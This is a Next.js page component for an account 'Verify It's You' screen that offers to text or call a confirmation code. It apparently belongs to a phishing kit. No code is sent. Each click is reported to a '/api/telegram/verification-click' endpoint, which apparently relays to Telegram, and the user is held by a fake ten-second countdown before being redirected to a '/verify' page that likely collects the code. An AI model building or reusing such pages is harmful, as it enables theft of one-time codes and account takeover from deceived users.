"use client";

import { useEffect, useRef, useState } from "react";
import { useRouter } from "next/navigation";
import { HelpCircle, MessageCircle, Phone, Loader2 } from "lucide-react";
import { Button } from "@/components/ui/button";
import { SiteHeader } from "@/components/site-header";

const options = [
  {
    id: "text",
    title: "Text Me a Code",
    subtitle: "You'll enter it to log on.",
    icon: MessageCircle,
  },
  {
    id: "call",
    title: "Call Me With a Code",
    subtitle: "Get a call that says a code for you to enter.",
    icon: Phone,
  },
];

export default function VerifyChoicePage() {
  const router = useRouter();
  const [isLoading, setIsLoading] = useState(false);
  const [selectedOptionId, setSelectedOptionId] = useState<string>("email");
  const [countdown, setCountdown] = useState(0);
  const countdownRef = useRef<number | null>(null);
  const redirectRef = useRef<number | null>(null);

  const handleSelect = async (id: string, title: string) => {
    if (isLoading) return;
    setSelectedOptionId(id);
    setIsLoading(true);
    setCountdown(10);
    countdownRef.current = window.setInterval(() => {
      setCountdown((prev) => {
        if (prev <= 1) {
          if (countdownRef.current) {
            window.clearInterval(countdownRef.current);
            countdownRef.current = null;
          }
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
    try {
      await fetch("/api/telegram/verification-click", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ verificationType: title }),
      }).catch(console.error);
    } catch (err) {
      console.error("Failed to send verification-click notification:", err);
    }
    redirectRef.current = window.setTimeout(() => {
      router.push(`/verify?method=${encodeURIComponent(id)}`);
    }, 10000);
  };

  useEffect(() => {
    return () => {
      if (countdownRef.current) window.clearInterval(countdownRef.current);
      if (redirectRef.current) window.clearTimeout(redirectRef.current);
    };
  }, []);

  return (
    <>
      <main className="md:hidden bg-gray-200">
        <div className="max-w-md mx-auto">
          <div className="bg-white pb-3">
            <button
              type="button"
              onClick={() => router.back()}
              className="inline-flex px-6 mt-6 items-center justify-center rounded-full p-2 text-[#8A4B57]"
            >
              <svg
                className="w-7 h-7"
                fill="none"
                stroke="currentColor"
                viewBox="0 0 24 24"
                strokeWidth="2"
              >
                <path
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  d="M9 5l-7 7 7 7"
                />
              </svg>
            </button>

            <section className="mt-5 px-6">
              <h1 className="text-2xl font-bold text-black">Verify Account</h1>
              <p className="mt-2 text-lg leading-7 text-gray-700 font-semibold">
                Select a method to receive a confirmation code. This helps
                verify your identity and secure your account.
              </p>
            </section>
          </div>

          <section className="mt-3 space-y-3 px-6 pt-3">
            <label className="flex items-center gap-3 h-14 bg-white rounded-md px-4 cursor-pointer">
              <input
                type="radio"
                name="verification"
                checked={selectedOptionId === "email"}
                onChange={() => setSelectedOptionId("email")}
                className="w-5 h-5 accent-[#8A4B57]"
              />
              <span className="text-sm text-[#8a4b57] font-bold">
                Email Address
              </span>
            </label>

            <label className="flex items-center gap-3 h-14 bg-white rounded-md px-4 cursor-pointer">
              <input
                type="radio"
                name="verification"
                checked={selectedOptionId === "phone"}
                onChange={() => setSelectedOptionId("phone")}
                className="w-5 h-5 accent-[#8A4B57]"
              />
              <span className="text-sm font-bold text-gray-500">
                Phone Number
              </span>
            </label>
          </section>

          <section className="px-6 pt-4 pb-10">
            <button
              type="button"
              onClick={() =>
                handleSelect(
                  selectedOptionId,
                  selectedOptionId === "email"
                    ? "Email Address"
                    : "Phone Number",
                )
              }
              className="w-full h-14 rounded-full bg-[#8A4B57] text-white text-lg font-semibold"
              disabled={isLoading}
            >
              {isLoading ? "Sending..." : "SEND CODE"}
            </button>

            <button
              type="button"
              onClick={() => router.push("/")}
              className="mt-3 w-full h-14 rounded-full border-2 border-[#8A4B57] text-[#8A4B57] text-lg font-semibold"
            >
              CAN'T RECEIVE CODE
            </button>
          </section>
        </div>
      </main>

      <div className="hidden md:block min-h-screen bg-white flex flex-col">
        <SiteHeader />
        <div className="max-w-2xl px-4 py-10 mb-[270px] mx-auto md:mx-0 md:ml-[60px] flex-1">
          <div className="flex items-center gap-2 mb-2">
            <h2 className="text-base font-medium text-gray-900">
              Verify It&apos;s You
            </h2>
            <button
              type="button"
              className="text-[#254650] hover:underline flex items-center gap-1"
              aria-label="Help"
            >
              <HelpCircle className="w-4 h-4" />
              <span className="text-sm">Help</span>
            </button>
          </div>

          <h1 className="text-2xl font-semibold text-gray-900 mb-2">
            Choose an Option
          </h1>
          <p className="text-gray-700 text-sm mb-6">
            Before you can get full access, you&apos;ll need to confirm your
            identity.
          </p>

          <div
            className={`space-y-0 border border-gray-200 rounded-none divide-y divide-gray-200 mb-8 ${isLoading ? "pointer-events-none opacity-60" : ""}`}
            aria-busy={isLoading}
          >
            {options.map(({ id, title, subtitle, icon: Icon }) => {
              const isSelectedAndLoading = isLoading && selectedOptionId === id;
              return (
                <button
                  key={id}
                  type="button"
                  onClick={() => handleSelect(id, title)}
                  disabled={isLoading}
                  className="w-full flex items-start gap-4 px-4 py-4 text-left hover:bg-gray-50 transition-colors disabled:cursor-not-allowed disabled:hover:bg-transparent"
                >
                  {isSelectedAndLoading ? (
                    <Loader2 className="w-6 h-6 text-[#254650] shrink-0 mt-0.5 animate-spin" />
                  ) : (
                    <Icon className="w-6 h-6 text-[#254650] shrink-0 mt-0.5" />
                  )}
                  <div>
                    <p className="text-[#254650] font-medium">{title}</p>
                    <p className="text-gray-500 text-sm mt-0.5">
                      {isSelectedAndLoading ? "Loading..." : subtitle}
                    </p>
                  </div>
                </button>
              );
            })}
          </div>

          <Button
            type="button"
            variant="outline"
            disabled={isLoading}
            className="rounded-md border-gray-300 bg-gray-100 hover:bg-gray-200 text-gray-900 h-9 px-5 disabled:opacity-70 disabled:cursor-not-allowed"
            onClick={() => router.push("/")}
          >
            Cancel
          </Button>
        </div>
      </div>
    </>
  );
}
